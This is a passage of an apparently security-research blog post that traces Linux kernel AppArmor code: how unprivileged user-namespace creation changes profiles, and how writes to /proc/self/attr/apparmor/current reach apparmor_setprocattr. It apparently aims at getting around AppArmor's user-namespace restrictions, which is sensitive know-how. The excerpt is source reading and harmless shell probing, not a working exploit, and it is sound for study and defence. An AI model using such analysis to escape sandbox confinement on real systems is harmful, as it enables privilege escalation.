&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_label&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;aa_profile_ns_perm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_profile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apparmor_audit_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;u32&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_ruleset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rules&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;list_first_entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rules&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                            &lt;span class=&quot;n&quot;&gt;typeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rules&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_label&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_perms&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;perms&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;aa_state_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;state&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RULE_MEDIATES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rules&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ad&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile_unconfined&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [3]&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;profiles_ns&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unconfined&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [4]&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_label_parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [5]&lt;/span&gt;
                         &lt;span class=&quot;s&quot;&gt;&quot;unprivileged_userns&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GFP_KERNEL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                         &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ad&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Userns create - transitioning profile&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;perms&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;audit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;perms&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;allow&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hard_coded&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* [...] */&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;hard_coded:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;aa_apply_modes_to_perms&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;perms&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;How can we determine which profile the current process is using? Intuitively, it should be recorded somewhere under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/self/&lt;/code&gt;. By analyzing the source code and using tools like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grep&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find&lt;/code&gt; to search for relevant keywords in both file contents and filenames, we eventually locate &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/self/attr&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;This directory stores process-related attribute definitions, and within it, there’s a subdirectory named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apparmor&lt;/code&gt;, which contains AppArmor-specific information.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aaa@aaa:~/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt; /proc/self/attr
total 0
dr-xr-xr-x 2 aaa aaa 0 Feb 17 12:16 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
dr-xr-xr-x 9 aaa aaa 0 Feb 17 12:16 ..
dr-xr-xr-x 2 aaa aaa 0 Feb 17 12:16 apparmor
&lt;span class=&quot;nt&quot;&gt;-rw-rw-rw-&lt;/span&gt; 1 aaa aaa 0 Feb 17 12:16 current
&lt;span class=&quot;nt&quot;&gt;-rw-rw-rw-&lt;/span&gt; 1 aaa aaa 0 Feb 17 12:16 &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rw-rw-rw-&lt;/span&gt; 1 aaa aaa 0 Feb 17 12:16 fscreate
&lt;span class=&quot;nt&quot;&gt;-rw-rw-rw-&lt;/span&gt; 1 aaa aaa 0 Feb 17 12:16 keycreate
&lt;span class=&quot;nt&quot;&gt;-r--r--r--&lt;/span&gt; 1 aaa aaa 0 Feb 17 12:16 prev
dr-xr-xr-x 2 aaa aaa 0 Feb 17 12:16 smack
&lt;span class=&quot;nt&quot;&gt;-rw-rw-rw-&lt;/span&gt; 1 aaa aaa 0 Feb 17 12:16 sockcreate
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current&lt;/code&gt; within &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/self/attr/apparmor&lt;/code&gt; shows the profile currently in use. While it has write permissions, it appears to require a &lt;strong&gt;specific format&lt;/strong&gt; for modifications to take effect.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aaa@aaa:~/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /proc/self/attr/current
unconfined

aaa@aaa:~/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;AAA &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /proc/self/attr/current
&lt;span class=&quot;nt&quot;&gt;-bash&lt;/span&gt;: &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt;: write error: Invalid argument
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;By mapping these pseudo-file names back to the source code, we can determine the read/write handlers from the file operations.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define ATTR(LSMID, NAME, MODE)             \
    NOD(NAME, (S_IFREG|(MODE)),             \
        NULL, &amp;amp;proc_pid_attr_operations,    \
        { .lsmid = LSMID })
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid_entry&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;smack_attr_dir_stuff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_SMACK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;current&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;0666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;LSM_DIR_OPS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;smack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid_entry&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apparmor_attr_dir_stuff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_APPARMOR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;current&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mo&quot;&gt;0666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_APPARMOR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;prev&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;mo&quot;&gt;0444&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_APPARMOR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;exec&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;mo&quot;&gt;0666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;LSM_DIR_OPS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;apparmor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid_entry&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attr_dir_stuff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_UNDEF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;current&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;mo&quot;&gt;0666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_UNDEF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;prev&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;        &lt;span class=&quot;mo&quot;&gt;0444&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_UNDEF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;exec&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;        &lt;span class=&quot;mo&quot;&gt;0666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_UNDEF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;fscreate&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;    &lt;span class=&quot;mo&quot;&gt;0666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_UNDEF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;keycreate&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;   &lt;span class=&quot;mo&quot;&gt;0666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_UNDEF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;sockcreate&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mo&quot;&gt;0666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;DIR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;smack&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mo&quot;&gt;0555&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;proc_smack_attr_dir_inode_ops&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc_smack_attr_dir_ops&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;DIR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;apparmor&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mo&quot;&gt;0555&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;proc_apparmor_attr_dir_inode_ops&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc_apparmor_attr_dir_ops&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The file ops &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;proc_pid_attr_operations&lt;/code&gt; defines the function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;proc_pid_attr_write()&lt;/code&gt; [6] as the write handler. At a lower level, this function calls AppArmor’s setprocattr hook, which corresponds to the function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apparmor_setprocattr()&lt;/code&gt; [7].&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file_operations&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc_pid_attr_operations&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc_pid_attr_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [6]&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;proc_pid_attr_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__user&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                   &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loff_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;security_setprocattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PROC_I&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;op&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lsmid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------------&lt;/span&gt;
                  &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dentry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;page&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                  &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;security_setprocattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lsmid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span 